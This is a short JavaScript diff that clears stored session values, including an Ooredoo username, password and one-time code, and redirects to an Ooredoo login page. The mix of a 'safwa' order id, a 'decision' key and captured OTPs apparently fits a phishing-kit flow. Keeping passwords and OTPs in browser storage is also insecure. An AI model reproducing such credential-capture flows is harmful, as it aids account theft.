@@ -162,9 +162,12 @@
       localStorage.removeItem(decisionKey);
       sessionStorage.removeItem(decisionKey);
       localStorage.removeItem('requestId');
-      sessionStorage.removeItem('safwa_order_id');
       localStorage.removeItem(flowKey);
       sessionStorage.removeItem(flowKey);
+      sessionStorage.removeItem('safwa_order_id');
+      sessionStorage.removeItem('ooredooUser');
+      sessionStorage.removeItem('ooredooPass');
+      sessionStorage.removeItem('ooredooOtp');
       sessionStorage.setItem('ooredooFlow', 'login');
       localStorage.setItem('ooredooFlow', 'login');
       window.location.href = 'login_ooredoo.html';
